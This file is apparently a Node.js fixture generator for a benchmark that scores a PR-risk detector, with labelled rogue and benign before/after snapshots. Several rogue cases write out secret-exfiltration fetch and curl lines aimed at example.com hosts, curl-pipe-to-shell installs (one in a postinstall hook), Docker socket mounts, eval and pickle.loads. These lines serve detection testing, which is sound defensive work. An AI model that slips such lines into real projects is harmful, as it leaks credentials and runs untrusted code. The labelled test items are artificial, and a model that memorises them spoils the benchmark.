#!/usr/bin/env node
// Source of truth for the CapabilityEcho benchmark corpus.
//
// Each case is a labeled before/after PR snapshot. `node build-fixtures.mjs`
// materializes them under benchmark/fixtures/<class>/<id>/{before,after,label.json}.
// The committed fixtures are what run-benchmark.mjs scores; regenerate them
// here whenever a case changes so the two never drift.
//
// Labels are GROUND TRUTH, written from the change's intent — not from what
// the tool happens to emit. A rogue case that the tool misses is a real
// false negative and must show up as one in the numbers.

import { mkdir, rm, writeFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const here = dirname(fileURLToPath(import.meta.url));
const fixturesDir = join(here, 'fixtures');

const L = (...lines) => lines.join('\n') + '\n';

// Shared baselines so before/after diffs read like real PRs.
const SYNC_BASE = L(
  'export function buildEventPayload(event) {',
  '  return { type: event.type, at: Date.now() };',
  '}'
);
const CI_READ = L(
  'name: ci',
  'on: [push]',
  'permissions:',
  '  contents: read',
  'jobs:',
  '  build:',
  '    runs-on: ubuntu-latest',
  '    steps:',
  '      - run: npm test'
);
const CI_WRITE = L(
  'name: ci',
  'on: [push]',
  'permissions:',
  '  contents: write',
  'jobs:',
  '  build:',
  '    runs-on: ubuntu-latest',
  '    steps:',
  '      - run: npm test'
);
const DOCKER_BASE = L('FROM node:20-alpine', 'WORKDIR /app', 'COPY package.json .', 'RUN npm ci');
const SHELL_BOOT_BASE = L('#!/usr/bin/env bash', 'set -euo pipefail', 'echo "setup"');

const pkg = (obj) => JSON.stringify(obj, null, 2) + '\n';

const cases = [
  // ============================ ROGUE ============================
  {
    id: 'R01-js-external-fetch',
    label: 'rogue',
    surface: 'source',
    description: 'Adds an outbound fetch() to an external host in a sync module.',
    expectKinds: ['capability_echo.external_fetch_added'],
    expectMinRating: 'medium',
    before: { 'src/sync.js': SYNC_BASE },
    after: {
      'src/sync.js':
        SYNC_BASE +
        L(
          '',
          'export async function sendEvent(event) {',
          '  const res = await fetch("https://api.example.com/v1/events", { method: "POST" });',
          '  return res.ok;',
          '}'
        )
    }
  },
  {
    id: 'R02-js-secret-exfil',
    label: 'rogue',
    surface: 'source',
    description: 'Sends an env-secret-shaped bearer token to an external collector.',
    expectKinds: ['capability_echo.source_secret_exfil_pattern', 'capability_echo.external_fetch_added'],
    expectMinRating: 'high',
    before: { 'src/sync.js': SYNC_BASE },
    after: {
      'src/sync.js':
        SYNC_BASE +
        L(
          '',
          'export async function report(event) {',
          '  await fetch("https://collector.example.com/events", { headers: { Authorization: `Bearer ${process.env.API_TOKEN}` } });',
          '}'
        )
    }
  },
  {
    id: 'R03-js-subprocess',
    label: 'rogue',
    surface: 'source',
    description: 'Adds a child_process.execSync subprocess spawn.',
    expectKinds: ['capability_echo.subprocess_spawn_added'],
    expectMinRating: 'high',
    before: { 'src/build.js': L('export function clean() {', '  return true;', '}') },
    after: {
      'src/build.js': L(
        'export function clean() {',
        '  return true;',
        '}',
        '',
        'import { execSync } from "node:child_process";',
        'export function deploy() {',
        '  execSync("rsync -a dist/ user@host:/srv/app");',
        '}'
      )
    }
  },
  {
    id: 'R04-js-eval',
    label: 'rogue',
    surface: 'source',
    description: 'Adds a dynamic eval() of caller-supplied code.',
    expectKinds: ['capability_echo.dynamic_eval_added'],
    expectMinRating: 'critical',
    before: { 'src/plugins.js': L('export function load() {', '  return [];', '}') },
    after: {
      'src/plugins.js': L(
        'export function load() {',
        '  return [];',
        '}',
        '',
        'export function run(code) {',
        '  return eval(code);',
        '}'
      )
    }
  },
  {
    id: 'R05-py-requests-get',
    label: 'rogue',
    surface: 'source',
    description: 'Adds a requests.get() to an external URL.',
    expectKinds: ['capability_echo.external_fetch_added'],
    expectMinRating: 'medium',
    before: { 'agent.py': L('def summarize(items):', '    return len(items)') },
    after: {
      'agent.py': L(
        'def summarize(items):',
        '    return len(items)',
        '',
        'import requests',
        'def fetch_models():',
        '    resp = requests.get("https://models.example.com/v1/list")',
        '    return resp.json()'
      )
    }
  },
  {
    id: 'R06-py-subprocess',
    label: 'rogue',
    surface: 'source',
    description: 'Adds a subprocess.Popen spawn.',
    expectKinds: ['capability_echo.subprocess_spawn_added'],
    expectMinRating: 'high',
    before: { 'agent.py': L('def summarize(items):', '    return len(items)') },
    after: {
      'agent.py': L(
        'def summarize(items):',
        '    return len(items)',
        '',
        'import subprocess',
        'def run_agent():',
        '    subprocess.Popen(["bash", "deploy.sh"], shell=False)'
      )
    }
  },
  {
    id: 'R07-py-pickle',
    label: 'rogue',
    surface: 'source',
    description: 'Adds pickle.loads on untrusted bytes (unsafe deserialize).',
    expectKinds: ['capability_echo.unsafe_deserialize_added'],
    expectMinRating: 'critical',
    before: { 'agent.py': L('def summarize(items):', '    return len(items)') },
    after: {
      'agent.py': L(
        'def summarize(items):',
        '    return len(items)',
        '',
        'import pickle',
        'def load_state(blob):',
        '    return pickle.loads(blob)'
      )
    }
  },
  {
    id: 'R08-py-eval',
    label: 'rogue',
    surface: 'source',
    description: 'Adds eval() of a runtime expression.',
    expectKinds: ['capability_echo.dynamic_eval_added'],
    expectMinRating: 'critical',
    before: { 'agent.py': L('def summarize(items):', '    return len(items)') },
    after: {
      'agent.py': L(
        'def summarize(items):',
        '    return len(items)',
        '',
        'def evaluate(expr):',
        '    return eval(expr)'
      )
    }
  },
  {
    id: 'R09-shell-pipe-to-shell',
    label: 'rogue',
    surface: 'source',
    description: 'Adds curl | bash remote install to a bootstrap script.',
    expectKinds: ['capability_echo.shell_pipe_to_shell'],
    expectMinRating: 'critical',
    before: { 'scripts/bootstrap.sh': SHELL_BOOT_BASE },
    after: { 'scripts/bootstrap.sh': SHELL_BOOT_BASE + L('curl https://install.example.com/agent.sh | bash') }
  },
  {
    id: 'R10-shell-external-download',
    label: 'rogue',
    surface: 'source',
    description: 'Adds a wget of an external binary into the repo.',
    expectKinds: ['capability_echo.shell_external_download'],
    expectMinRating: 'medium',
    before: { 'scripts/fetch.sh': L('#!/usr/bin/env bash', 'set -euo pipefail', 'echo "fetch"') },
    after: {
      'scripts/fetch.sh': L(
        '#!/usr/bin/env bash',
        'set -euo pipefail',
        'echo "fetch"',
        'wget https://models.example.com/latest.bin -O model.bin'
      )
    }
  },
  {
    id: 'R11-workflow-pull-request-target',
    label: 'rogue',
    surface: 'workflow',
    description: 'Switches a workflow trigger to pull_request_target.',
    expectKinds: ['capability_echo.workflow_pull_request_target'],
    expectMinRating: 'high',
    before: {
      '.github/workflows/agent.yml': L(
        'name: agent',
        'on:',
        '  pull_request:',
        'jobs:',
        '  run:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567'
      )
    },
    after: {
      '.github/workflows/agent.yml': L(
        'name: agent',
        'on:',
        '  pull_request_target:',
        'jobs:',
        '  run:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567'
      )
    }
  },
  {
    id: 'R12-workflow-write-permissions',
    label: 'rogue',
    surface: 'workflow',
    description: 'Widens the workflow token to contents: write.',
    expectKinds: ['capability_echo.workflow_workflow_level_write_permission'],
    expectMinRating: 'high',
    before: { '.github/workflows/ci.yml': CI_READ },
    after: { '.github/workflows/ci.yml': CI_WRITE }
  },
  {
    id: 'R13-workflow-secret-exfil-curl',
    label: 'rogue',
    surface: 'workflow',
    description: 'Adds a curl that ships a CI secret to an external host.',
    expectKinds: ['capability_echo.workflow_secret_exfil_pattern', 'capability_echo.workflow_external_curl'],
    expectMinRating: 'high',
    before: {
      '.github/workflows/deploy.yml': L(
        'name: deploy',
        'on: [push]',
        'jobs:',
        '  deploy:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm run build'
      )
    },
    after: {
      '.github/workflows/deploy.yml': L(
        'name: deploy',
        'on: [push]',
        'jobs:',
        '  deploy:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm run build',
        '      - run: curl https://hooks.example.com/notify -H "Authorization: Bearer ${{ secrets.API_TOKEN }}"'
      )
    }
  },
  {
    id: 'R14-workflow-docker-socket',
    label: 'rogue',
    surface: 'workflow',
    description: 'Mounts the host Docker socket into a workflow container.',
    expectKinds: ['capability_echo.workflow_docker_socket_mount'],
    expectMinRating: 'critical',
    before: {
      '.github/workflows/agent.yml': L(
        'name: agent',
        'on: [push]',
        'jobs:',
        '  run:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      )
    },
    after: {
      '.github/workflows/agent.yml': L(
        'name: agent',
        'on: [push]',
        'jobs:',
        '  run:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test',
        '      - run: docker run -v /var/run/docker.sock:/var/run/docker.sock agent-runner'
      )
    }
  },
  {
    id: 'R15-dockerfile-remote-add',
    label: 'rogue',
    surface: 'container',
    description: 'Adds a remote ADD pulling an executable over the network.',
    expectKinds: ['capability_echo.dockerfile_remote_add'],
    expectMinRating: 'high',
    before: { Dockerfile: DOCKER_BASE },
    after: { Dockerfile: DOCKER_BASE + L('ADD https://install.example.com/agent /usr/local/bin/agent') }
  },
  {
    id: 'R16-dockerfile-pipe-to-shell',
    label: 'rogue',
    surface: 'container',
    description: 'Adds a RUN curl | bash remote install to the image build.',
    expectKinds: ['capability_echo.dockerfile_pipe_to_shell'],
    expectMinRating: 'critical',
    before: { Dockerfile: DOCKER_BASE },
    after: { Dockerfile: DOCKER_BASE + L('RUN curl https://install.example.com/setup.sh | bash') }
  },
  {
    id: 'R17-pkg-high-capability-dep',
    label: 'rogue',
    surface: 'package',
    description: 'Adds puppeteer — a headless-browser high-capability dependency.',
    expectKinds: ['capability_echo.high_capability_dep_added'],
    expectMinRating: 'high',
    before: { 'package.json': pkg({ name: 'app', version: '1.0.0', dependencies: { lodash: '^4.17.21' } }) },
    after: {
      'package.json': pkg({ name: 'app', version: '1.0.0', dependencies: { lodash: '^4.17.21', puppeteer: '^22.0.0' } })
    }
  },
  {
    id: 'R18-pkg-lifecycle-script',
    label: 'rogue',
    surface: 'package',
    description: 'Adds a postinstall lifecycle script that runs on install.',
    expectKinds: ['capability_echo.lifecycle_script_added'],
    expectMinRating: 'high',
    before: { 'package.json': pkg({ name: 'app', version: '1.0.0', scripts: { build: 'tsc' } }) },
    after: {
      'package.json': pkg({ name: 'app', version: '1.0.0', scripts: { build: 'tsc', postinstall: 'node scripts/postinstall.js' } })
    }
  },
  {
    id: 'R19-pkg-postinstall-pipe-to-shell',
    label: 'rogue',
    surface: 'package',
    description: 'Adds a postinstall that pipes a remote script into a shell.',
    expectKinds: ['capability_echo.lifecycle_script_added', 'capability_echo.script_pipe_to_shell'],
    expectMinRating: 'critical',
    before: { 'package.json': pkg({ name: 'app', version: '1.0.0', scripts: { build: 'tsc' } }) },
    after: {
      'package.json': pkg({
        name: 'app',
        version: '1.0.0',
        scripts: { build: 'tsc', postinstall: 'curl https://install.example.com/x.sh | sh' }
      })
    }
  },
  {
    id: 'R20-multi-surface',
    label: 'rogue',
    surface: 'source',
    description: 'A single PR that exfiltrates a secret in source and widens the CI token at once.',
    expectKinds: [
      'capability_echo.source_secret_exfil_pattern',
      'capability_echo.external_fetch_added',
      'capability_echo.workflow_workflow_level_write_permission'
    ],
    expectMinRating: 'high',
    before: { 'src/sync.js': SYNC_BASE, '.github/workflows/ci.yml': CI_READ },
    after: {
      'src/sync.js':
        SYNC_BASE +
        L(
          '',
          'export async function report(event) {',
          '  await fetch("https://collector.example.com/events", { headers: { Authorization: `Bearer ${process.env.API_TOKEN}` } });',
          '}'
        ),
      '.github/workflows/ci.yml': CI_WRITE
    }
  },

  // ============================ BENIGN ============================
  {
    id: 'B01-js-pure-function',
    label: 'benign',
    surface: 'source',
    description: 'Adds a pure formatting helper. No capability change.',
    expectKinds: [],
    before: { 'src/format.js': L('export function pad(n) {', '  return String(n).padStart(2, "0");', '}') },
    after: {
      'src/format.js': L(
        'export function pad(n) {',
        '  return String(n).padStart(2, "0");',
        '}',
        '',
        'export function formatDuration(ms) {',
        '  const s = Math.floor(ms / 1000);',
        '  return `${pad(Math.floor(s / 60))}:${pad(s % 60)}`;',
        '}'
      )
    }
  },
  {
    id: 'B02-js-rename-refactor',
    label: 'benign',
    surface: 'source',
    description: 'Renames and reformats a function with identical behavior.',
    expectKinds: [],
    before: { 'src/calc.js': L('export function t(a,b){ return a+b; }') },
    after: { 'src/calc.js': L('export function add(a, b) {', '  return a + b;', '}') }
  },
  {
    id: 'B03-js-internal-fetch',
    label: 'benign',
    surface: 'source',
    description: 'Adds a same-origin (relative) fetch — not an external capability.',
    expectKinds: [],
    before: { 'src/api.js': L('export const BASE = "/api";') },
    after: {
      'src/api.js': L(
        'export const BASE = "/api";',
        '',
        'export async function getUsers() {',
        '  const res = await fetch("/api/users");',
        '  return res.json();',
        '}'
      )
    }
  },
  {
    id: 'B04-js-add-test',
    label: 'benign',
    surface: 'source',
    description: 'Adds a unit test file with assertions only.',
    expectKinds: [],
    before: { 'src/sum.js': L('export function sum(xs) {', '  return xs.reduce((a, b) => a + b, 0);', '}') },
    after: {
      'src/sum.js': L('export function sum(xs) {', '  return xs.reduce((a, b) => a + b, 0);', '}'),
      'test/sum.test.js': L(
        'import test from "node:test";',
        'import assert from "node:assert";',
        'import { sum } from "../src/sum.js";',
        'test("sums", () => { assert.equal(sum([1, 2, 3]), 6); });'
      )
    }
  },
  {
    id: 'B05-py-pure',
    label: 'benign',
    surface: 'source',
    description: 'Adds a pure numeric helper in Python.',
    expectKinds: [],
    before: { 'util.py': L('def clamp(x, lo, hi):', '    return max(lo, min(hi, x))') },
    after: {
      'util.py': L(
        'def clamp(x, lo, hi):',
        '    return max(lo, min(hi, x))',
        '',
        'def mean(values):',
        '    return sum(values) / len(values) if values else 0.0'
      )
    }
  },
  {
    id: 'B06-py-safe-yaml',
    label: 'benign',
    surface: 'source',
    description: 'Loads config with yaml.safe_load — the safe path, no eval/deserialize risk.',
    expectKinds: [],
    before: { 'config.py': L('DEFAULTS = {"timeout": 30}') },
    after: {
      'config.py': L(
        'DEFAULTS = {"timeout": 30}',
        '',
        'import yaml',
        'def load_config(path):',
        '    with open(path) as fh:',
        '        return yaml.safe_load(fh)'
      )
    }
  },
  {
    id: 'B07-docs-only',
    label: 'benign',
    surface: 'none',
    description: 'Documentation-only change; no executable surface touched.',
    expectKinds: [],
    before: { 'README.md': L('# Project', '', 'Old docs.') },
    after: { 'README.md': L('# Project', '', 'New, expanded docs.', '', '## Usage', '', 'Run it.'), 'CONTRIBUTING.md': L('# Contributing', '', 'Open a PR.') }
  },
  {
    id: 'B08-pkg-benign-deps',
    label: 'benign',
    surface: 'package',
    description: 'Adds date-fns and zod — ordinary, non-capability dependencies.',
    expectKinds: [],
    before: { 'package.json': pkg({ name: 'app', version: '1.0.0', dependencies: { lodash: '^4.17.21' } }) },
    after: {
      'package.json': pkg({
        name: 'app',
        version: '1.0.0',
        dependencies: { lodash: '^4.17.21', 'date-fns': '^3.6.0', zod: '^3.23.0' }
      })
    }
  },
  {
    id: 'B09-pkg-normal-scripts',
    label: 'benign',
    surface: 'package',
    description: 'Adds ordinary non-lifecycle scripts (test, lint).',
    expectKinds: [],
    before: { 'package.json': pkg({ name: 'app', version: '1.0.0', scripts: { build: 'tsc' } }) },
    after: {
      'package.json': pkg({ name: 'app', version: '1.0.0', scripts: { build: 'tsc', test: 'node --test', lint: 'eslint .' } })
    }
  },
  {
    id: 'B10-workflow-benign',
    label: 'benign',
    surface: 'workflow',
    description: 'Adds standard CI steps: read-only token, pinned action, ubuntu-latest.',
    expectKinds: [],
    before: {
      '.github/workflows/ci.yml': L(
        'name: ci',
        'on:',
        '  pull_request:',
        'permissions:',
        '  contents: read',
        'jobs:',
        '  build:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567'
      )
    },
    after: {
      '.github/workflows/ci.yml': L(
        'name: ci',
        'on:',
        '  pull_request:',
        'permissions:',
        '  contents: read',
        'jobs:',
        '  build:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567',
        '      - run: npm ci',
        '      - run: npm test'
      )
    }
  },
  {
    id: 'B11-dockerfile-benign',
    label: 'benign',
    surface: 'container',
    description: 'Standard Dockerfile build with COPY + npm ci; no remote fetch.',
    expectKinds: [],
    before: { Dockerfile: L('FROM node:20-alpine', 'WORKDIR /app') },
    after: {
      Dockerfile: L(
        'FROM node:20-alpine',
        'WORKDIR /app',
        'COPY package.json package-lock.json ./',
        'RUN npm ci',
        'COPY . .',
        'CMD ["node", "dist/index.js"]'
      )
    }
  },
  {
    id: 'B12-shell-benign',
    label: 'benign',
    surface: 'source',
    description: 'A release script doing only local file operations.',
    expectKinds: [],
    before: { 'scripts/release.sh': L('#!/usr/bin/env bash', 'set -euo pipefail') },
    after: {
      'scripts/release.sh': L('#!/usr/bin/env bash', 'set -euo pipefail', 'mkdir -p dist', 'cp -r src/* dist/', 'echo "done"')
    }
  },
  {
    id: 'B13-pkg-version-bump',
    label: 'benign',
    surface: 'package',
    description: 'Bumps an existing dependency version — not a new capability.',
    expectKinds: [],
    before: { 'package.json': pkg({ name: 'app', version: '1.0.0', dependencies: { lodash: '^4.17.0' } }) },
    after: { 'package.json': pkg({ name: 'app', version: '1.0.0', dependencies: { lodash: '^4.17.21' } }) }
  },
  {
    id: 'B14-js-add-internal-module',
    label: 'benign',
    surface: 'source',
    description: 'Adds a self-contained in-memory cache class. No external surface.',
    expectKinds: [],
    before: { 'src/index.js': L('export const VERSION = "1.0.0";') },
    after: {
      'src/index.js': L('export const VERSION = "1.0.0";'),
      'src/cache.js': L(
        'export class Cache {',
        '  constructor() { this.map = new Map(); }',
        '  get(k) { return this.map.get(k); }',
        '  set(k, v) { this.map.set(k, v); }',
        '}'
      )
    }
  }
];

async function writeTree(root, files) {
  for (const [relPath, content] of Object.entries(files)) {
    const abs = join(root, relPath);
    await mkdir(dirname(abs), { recursive: true });
    await writeFile(abs, content, 'utf8');
  }
}

async function main() {
  await rm(fixturesDir, { recursive: true, force: true });

  const ids = new Set();
  for (const c of cases) {
    if (ids.has(c.id)) throw new Error(`duplicate case id: ${c.id}`);
    ids.add(c.id);

    const classDir = c.label === 'rogue' ? 'rogue' : 'benign';
    const caseDir = join(fixturesDir, classDir, c.id);
    await writeTree(join(caseDir, 'before'), c.before);
    await writeTree(join(caseDir, 'after'), c.after);

    const label = {
      id: c.id,
      label: c.label,
      surface: c.surface,
      description: c.description,
      expectFlagged: c.label === 'rogue',
      expectKinds: c.expectKinds,
      ...(c.expectMinRating ? { expectMinRating: c.expectMinRating } : {})
    };
    await writeFile(join(caseDir, 'label.json'), JSON.stringify(label, null, 2) + '\n', 'utf8');
  }

  const rogue = cases.filter((c) => c.label === 'rogue').length;
  const benign = cases.length - rogue;
  process.stdout.write(`Materialized ${cases.length} fixtures (${rogue} rogue, ${benign} benign) under ${fixturesDir}\n`);
}

await main();
